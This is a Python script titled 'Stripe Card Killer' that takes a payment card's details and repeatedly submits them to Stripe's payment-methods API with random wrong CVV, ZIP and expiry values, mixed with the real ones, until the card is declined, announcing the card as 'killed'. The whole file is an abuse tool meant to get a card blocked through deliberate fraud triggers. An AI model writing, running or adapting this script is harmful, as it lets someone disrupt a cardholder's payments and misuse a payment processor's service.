import requests
import time
import random
import threading

# ========== USER INPUT ==========
print("="*50)
print("💳 STRIPE CARD KILLER (LIVE API FLOW)")
print("="*50)

card_number = input("Enter Card Number: ")
exp_month   = input("Enter Expiry Month (MM): ")
exp_year    = input("Enter Expiry Year (YY): ")
cvv_real    = input("Enter CVV: ")
zip_real    = input("Enter ZIP Code: ")

# ========== STRIPE SETUP ==========
stripe_api_url = "https://api.stripe.com/v1/payment_methods"
stripe_key     = "sk_test_yourKeyHere"  # Replace with your real/test key

loading = True
start_time = time.time()

def animate_loading():
    bar = ["[⏳     ]", "[⏳⏳    ]", "[⏳⏳⏳   ]", "[⏳⏳⏳⏳  ]", "[⏳⏳⏳⏳⏳ ]", "[⏳⏳⏳⏳⏳⏳]"]
    while loading:
        for stage in bar:
            print(f"\rProcessing {stage}", end="", flush=True)
            time.sleep(0.3)

def stripe_charge(cvv, zip_code, month, year):
    try:
        headers = {
            "Authorization": f"Bearer {stripe_key}"
        }
        data = {
            "type": "card",
            "card[number]": card_number,
            "card[exp_month]": month,
            "card[exp_year]": year,
            "card[cvc]": cvv,
            "billing_details[address][postal_code]": zip_code
        }

        response = requests.post(stripe_api_url, headers=headers, data=data, timeout=10)
        result = response.json()

        if response.status_code == 200 and "id" in result:
            return "approved"
        elif "error" in result:
            return "declined"
        else:
            return "error"
    except Exception as e:
        return "timeout"

def kill_card():
    global loading
    attempt = 0
    killed = False

    while not killed:
        # === FAKE ATTEMPTS ===
        for _ in range(4):  # Adjust to 5 or 6 if needed
            fake_cvv = str(random.randint(100, 999))
            fake_zip = str(random.randint(10000, 99999))
            fake_month = str(random.randint(1, 12)).zfill(2)
            fake_year  = str(random.randint(25, 30))

            attempt += 1
            result = stripe_charge(fake_cvv, fake_zip, fake_month, fake_year)
            print(f"\n[Attempt {attempt}] Fake charge: {result}")

        # === REAL ATTEMPT ===
        result = stripe_charge(cvv_real, zip_real, exp_month, exp_year)

        if result == "declined":
            killed = True
        else:
            print("\n[✓] Card still alive... Retrying!\n")

    loading = False
    duration = round(time.time() - start_time, 2)
    print(f"\n💀 CARD SUCCESSFULLY KILLED! [Time: {duration}s]")

# ========== RUN THREADS ==========
t1 = threading.Thread(target=animate_loading)
t2 = threading.Thread(target=kill_card)

t1.start()
t2.start()
t2.join()
